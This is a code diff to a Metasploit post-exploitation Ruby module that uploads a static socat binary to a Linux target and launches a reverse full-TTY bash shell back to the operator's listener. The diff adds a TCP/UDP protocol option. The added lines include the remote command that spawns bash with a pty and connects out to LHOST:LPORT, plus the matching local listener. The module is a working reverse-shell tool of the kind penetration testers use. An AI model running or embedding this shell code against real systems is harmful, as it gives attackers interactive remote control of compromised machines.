@@ -12,10 +12,11 @@ class MetasploitModule < Msf::Post
       'Name'          => 'Linux Full TTY Shell Using Socat',
       'Description'   => %q{
         This module will upload and execute a reverse Socat based full TTY
-        shell. The module assumes usage of Kali or another Linux distro running
-        gnome as it will open a new gnome-terminal shell window. It requires socat
-        static-binaries which are included in sn0wfa11's msf repo or you can build
-        your own using andrew-d's static-binary repo linked below in the references.
+        shell. You can use either tcp or udp protocols . The module assumes usage 
+        of Kali or another Linux distro running gnome as it will open a new 
+        gnome-terminal shell window. It requires socat static-binaries which are 
+        included in sn0wfa11's msf repo or you can build your own using andrew-d's 
+        static-binary repo linked below in the references.
       },
       'License'       => MSF_LICENSE,
       'Author'        =>
@@ -39,7 +40,8 @@ class MetasploitModule < Msf::Post
         OptString.new('LPORT',         [ true, "Host To Connect To", "4444"]),
         OptString.new('WRITEABLE_DIR', [ true, "Writeable directory on target for Socat", "/tmp"]),
         OptString.new('SOCAT_86',      [ true, "Path to Socat x86 binary", "/root/git/msf/binaries/socat86"]),
-        OptString.new('SOCAT_64',      [ true, "Path to Socat x64 binary", "/root/git/msf/binaries/socat64"])
+        OptString.new('SOCAT_64',      [ true, "Path to Socat x64 binary", "/root/git/msf/binaries/socat64"]),
+        OptEnum.new('PROTO',           [ true, "The Protocol to use", 'tcp', ['tcp','udp']])
       ], self.class)
   end
 
@@ -55,6 +57,7 @@ class MetasploitModule < Msf::Post
 
   def socat_local
     lport = datastore['LPORT']
+    proto = datastore['PROTO']
     socat_local = Rex::FileUtils.find_full_path("socat")
     gnome_local = Rex::FileUtils.find_full_path("gnome-terminal")
     bash_local = Rex::FileUtils.find_full_path("bash")
@@ -71,7 +74,7 @@ class MetasploitModule < Msf::Post
     fail_with("No local 'gnome-terminal' found!") if !gnome_local
     fail_with("No local 'bash' found!") if !bash_local 
 
-    cmd = "#{gnome_local} -e '#{bash_local} -c \"#{socat_local} file:`tty`,raw,echo=0 tcp-listen:#{lport}; #{bash_local}\"'"
+    cmd = "#{gnome_local} -e '#{bash_local} -c \"#{socat_local} file:`tty`,raw,echo=0 #{proto}-listen:#{lport}; #{bash_local}\"'"
     print_status("Executing the local socat listner")
     return local_execute(cmd)
   end
@@ -143,11 +146,12 @@ class MetasploitModule < Msf::Post
   def run_socat(socat_target)
     lhost = datastore['LHOST']
     lport = datastore['LPORT']
+    proto = datastore['PROTO']
     bash_remote = get_remote_path("bash")
     fail_with("No remote 'bash' or 'sh' shells found") if !bash_remote
 
     print_status("Executing Remote Socat")
-    cmd = "#{bash_remote} -c \"export TERM=xterm-color; #{socat_target} exec:'#{bash_remote} -li',pty,stderr,setsid,sigint,sane tcp:#{lhost}:#{lport} &\""
+    cmd = "#{bash_remote} -c \"export TERM=xterm-color; #{socat_target} exec:'#{bash_remote} -li',pty,stderr,setsid,sigint,sane #{proto}:#{lhost}:#{lport} &\""
     execute(cmd)   
   end
 
